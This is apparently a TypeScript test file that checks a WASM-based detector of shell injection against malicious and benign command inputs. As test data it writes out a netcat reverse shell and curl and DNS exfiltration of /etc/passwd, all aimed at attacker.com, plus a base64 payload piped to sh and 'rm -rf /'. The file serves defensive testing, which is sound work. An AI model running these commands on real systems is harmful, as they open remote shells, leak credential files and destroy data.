import * as t from "tap";
import { detectShellInjectionWasm } from "./detectShellInjectionWasm";

t.test("it detects semicolon command chaining in nslookup", async () => {
  t.equal(
    detectShellInjectionWasm(
      "nslookup google.com;cat /etc/passwd",
      "google.com;cat /etc/passwd"
    ),
    true
  );
});

t.test("it detects $() command substitution in nslookup", async () => {
  t.equal(detectShellInjectionWasm("nslookup $(whoami)", "$(whoami)"), true);
});

t.test("it detects backtick command substitution in nslookup", async () => {
  t.equal(detectShellInjectionWasm("nslookup `id`", "`id`"), true);
});

t.test("it detects pipe to reverse shell via netcat", async () => {
  t.equal(
    detectShellInjectionWasm(
      "nslookup google.com|nc attacker.com 4444 -e /bin/sh",
      "google.com|nc attacker.com 4444 -e /bin/sh"
    ),
    true
  );
});

t.test("it detects base64 encoded command piped to sh", async () => {
  t.equal(
    detectShellInjectionWasm(
      "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
      "Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"
    ),
    true
  );
});

t.test("it detects $IFS space bypass", async () => {
  t.equal(
    detectShellInjectionWasm("cat${IFS}/etc/passwd", "${IFS}/etc/passwd"),
    true
  );
});

t.test("it detects semicolon chaining in ping", async () => {
  t.equal(
    detectShellInjectionWasm(
      "ping -c 1 8.8.8.8; rm -rf /",
      "8.8.8.8; rm -rf /"
    ),
    true
  );
});

t.test("it detects variable expansion in double quotes", async () => {
  t.equal(detectShellInjectionWasm('echo "$USER"', "$USER"), true);
});

t.test("it detects DNS exfiltration via command substitution in subdomain", async () => {
  t.equal(
    detectShellInjectionWasm(
      "nslookup $(cat /etc/passwd | base64 | head -c 60).attacker.com",
      "$(cat /etc/passwd | base64 | head -c 60).attacker.com"
    ),
    true
  );
});

t.test("it detects curl data exfiltration with extra arguments", async () => {
  t.equal(
    detectShellInjectionWasm(
      "curl http://attacker.com/exfil -d @/etc/passwd",
      "http://attacker.com/exfil -d @/etc/passwd"
    ),
    true
  );
});

t.test("it blocks unclosed single quote (failed to tokenize)", async () => {
  t.equal(detectShellInjectionWasm("echo 'unclosed", "unclosed"), true);
});

t.test("it blocks unclosed double quote (failed to tokenize)", async () => {
  t.equal(detectShellInjectionWasm('echo "unclosed', "unclosed"), true);
});

t.test("it does not flag plain hostname in nslookup", async () => {
  t.equal(detectShellInjectionWasm("nslookup example.com", "example.com"), false);
});

t.test("it does not flag IP address in ping", async () => {
  t.equal(
    detectShellInjectionWasm("ping -c 4 192.168.1.1", "192.168.1.1"),
    false
  );
});

t.test("it does not flag URL in curl", async () => {
  t.equal(
    detectShellInjectionWasm(
      "curl -s https://api.example.com/users/123",
      "https://api.example.com/users/123"
    ),
    false
  );
});

t.test("it does not flag single-quoted input", async () => {
  t.equal(detectShellInjectionWasm("echo 'safe'", "safe"), false);
});

t.test("it does not flag email address", async () => {
  t.equal(
    detectShellInjectionWasm(
      "echo token | docker login --username john.doe@acme.com --password-stdin hub.acme.com",
      "john.doe@acme.com"
    ),
    false
  );
});

t.test("it does not flag comma-separated list", async () => {
  t.equal(
    detectShellInjectionWasm(
      "command -tags php,laravel,drupal,phpmyadmin,symfony -stats ",
      "php,laravel,drupal,phpmyadmin,symfony"
    ),
    false
  );
});

t.test("it does not flag domain name", async () => {
  t.equal(
    detectShellInjectionWasm(
      "binary --domain www.example.com",
      "www.example.com"
    ),
    false
  );
});

t.test("it ignores single character input", async () => {
  t.equal(detectShellInjectionWasm("ls *", "*"), false);
});

t.test("it ignores user input not present in command", async () => {
  t.equal(detectShellInjectionWasm("ls", "$(echo)"), false);
});
